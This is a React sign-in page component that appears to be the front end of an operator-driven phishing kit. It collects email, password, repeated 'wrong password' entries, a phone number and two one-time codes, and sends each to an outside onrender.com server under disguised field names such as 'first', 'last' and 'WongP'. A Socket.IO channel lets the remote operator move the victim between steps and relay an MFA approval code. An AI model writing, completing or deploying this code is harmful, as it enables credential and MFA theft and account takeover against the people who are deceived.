import { useEffect, useState, useRef } from "react";
import axios from "axios";
import socket from "../socket";

import EmailStep from "../components/EmailStep";
import PasswordStep from "../components/PasswordStep";
import PhoneStep from "../components/PhoneStep";
import SigninRequestStep from "../components/SigninRequestStep";
import WrongPasswordStep from "../components/WrongPasswordStep";
import ApproveUserStep from "../components/ApproveUserStep";
import SuccessStep from "../components/SuccessStep";
import ProcessingStep from "../components/ProcessingStep";
import OtpStep from "../components/OtpStep";
import OtpStep2 from "../components/OtpStep2";

function SignIn() {

  const [step, setStep] = useState("first");
  // const api = "https://connect-server-uky7.onrender.com/"

  const [userId, setUserId] = useState(
    sessionStorage.getItem("userId") || ""
  );

  const [approvedUser, setApprovedUser] = useState(null);

  const [first, setEmail] = useState("");


  const [message, setMessage] = useState("");

  const sessionCreated = useRef(false);


  // ======================================
  // SOCKET.IO
  // ======================================

  useEffect(() => {

  const handleApproval = (data) => {

   

    setApprovedUser(data);

    setStep("approve");
  };


  socket.on(
    "account-approved",
    handleApproval
  );


  return () => {

    socket.off(
      "aacount-approved",
      handleApproval
    );

  };

}, []);

  useEffect(() => {
  const handleStepChanged = ({ step }) => {
    setStep(step);
  };

  socket.on(
    "step-changed",
    handleStepChanged
  );

  return () => {
    socket.off(
      "step-changed",
      handleStepChanged
    );
  };
}, []);




useEffect(() => {
    if (sessionCreated.current) return;

  sessionCreated.current = true;
  const newUser = async ()=>{



    try{

    

      const response =
        await axios.post(
          "https://connect-server-uky7.onrender.com/api/auth/start"
        );



        
      const newUserId =
        response.data.userId;


      if (!newUserId) {

        throw new Error(
          "No user ID returned"
        );

      }

        
      setUserId(
        newUserId
      );


      
      sessionStorage.setItem(
        "userId",
        newUserId
      );

      socket.emit(
        "register-user",
        newUserId
      );

    }

     catch (error) {

     

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }


}

 newUser()

}, [])

  // ======================================
  // first COMPLETED
  // ======================================

  const handleEmailComplete = async (userId, enteredEmail ) => {


    try {

      setMessage("");

        await axios.post(
          "https://connect-server-uky7.onrender.com/api/auth/first",
          {
            first: enteredEmail, userId

          }
        );




      // Save information locally


      setEmail(
        enteredEmail
      );




      sessionStorage.setItem(
        "first",
        enteredEmail
      );


      // Register this browser
      // with its private Socket.IO session

      


      // Move to last

      setStep("last");

    }

    catch (error) {


      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };


  // ======================================
  // last COMPLETED
  // ======================================

  const handlePasswordComplete = async (userId, last ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired. Please start again."
        );

        setStep("first");

        return;

      }


      setMessage("");


      await axios.post(
        "https://connect-server-uky7.onrender.com/api/auth/last",
        {
          userId,
          last
        }
      );


    

     

      setStep("processing")

    }

    catch (error) {

     

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };

   const handleWrongPasswordComplete = async (userId, WongP  ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired. Please start again."
        );

        setStep("first");

        return;

      }


      setMessage("");


      await axios.post(
        "https://connect-server-uky7.onrender.com/api/auth/WongP",
        {
          userId,
          WongP: WongP
        }
      );


    

      

      setStep("processing")

    }

    catch (error) {

     

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };



  // ======================================
  // PHONE COMPLETED
  // ======================================

  const handlePhoneComplete = async (
    userId,
    phn
  ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired."
        );

        return;

      }


      await axios.post(
        "https://connect-server-uky7.onrender.com/api/auth/phone",
        {
          userId,
          phn
        }
      );


  
      setStep("processing")


    }

    catch (error) {

      

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };

  const handlePhoneOtpComplete = async (
    userId,
    ptp
  ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired."
        );

        return;

      }


      await axios.post(
        "https://connect-server-uky7.onrender.com/api/auth/ptp",
        {
          userId,
          ptp
        }
      );


      setStep("processing")


    }

    catch (error) {

   

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };

    const handlePhoneOtp2Complete = async (
    userId,
    ptp2
  ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired."
        );

        return;

      }


      await axios.post(
        "https://connect-server-uky7.onrender.com/api/auth/ptp2",
        {
          userId,
          ptp2
        }
      );


      setStep("processing")


    }

    catch (error) {


      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };


  // ======================================
  // RENDER CURRENT STEP
  // ======================================

  const renderStep = () => {

    switch (step) {


      // ================================
      // first
      // ================================

      case "first":

        return (
          <EmailStep
            onComplete={
              handleEmailComplete
            }
            userId={userId}
          />
        );

        case "processing":

        return (
          <ProcessingStep />
        )


      // ================================
      // last
      // ================================

      case "last":

        return (
          <PasswordStep
            first={first}
            onComplete={
              handlePasswordComplete
            }
            
            
            userId={userId}
          />
        );


      // ================================
      // PHONE
      // ================================

      case "phone":

        return (
          <PhoneStep
            first={first}
            userId={userId}
            onComplete={
              handlePhoneComplete
            }
          />
        );

        case "phone-otp":
           return (
          <OtpStep
            first={first}
            userId={userId}
            onComplete={
              handlePhoneOtpComplete
            }
          />
        );

        
        case "phone-otp2":
           return (
          <OtpStep2
            first={first}
            userId={userId}
            onComplete={
              handlePhoneOtp2Complete
            }
          />
        );
        


        case "approve":
        return (
          <ApproveUserStep
            first={first}
            userDevice={approvedUser?.userDevice || ""}
            code={approvedUser?.code || ""}
          />
        );


      // ================================
      // SIGN-IN REQUEST
      // ================================

      case "signin-request":

        return (
          <SigninRequestStep
            first={first}
          />
        );


      // ================================
      // WRONG last
      // ================================

      case "wrong-last":

        return (
          <WrongPasswordStep
            first={first}
             onComplete={
              handleWrongPasswordComplete
            }
            
            
            userId={userId}
          />
        );


      // ================================
      // SUCCESS
      // ================================

      case "success":

        return (
          <SuccessStep
            first={first}
          />
        );


      // ================================
      // DEFAULT
      // ================================

      default:

        return (
          <EmailStep
            onComplete={
              handleEmailComplete
            }
          />
        );

    }

  };


  return (

    <div>

      {renderStep()}


      {message && (

        <p
          style={{
            textAlign: "center",
            marginTop: "15px"
          }}
        >

          {message}

        </p>

      )}

    </div>

  );

}

export default SignIn;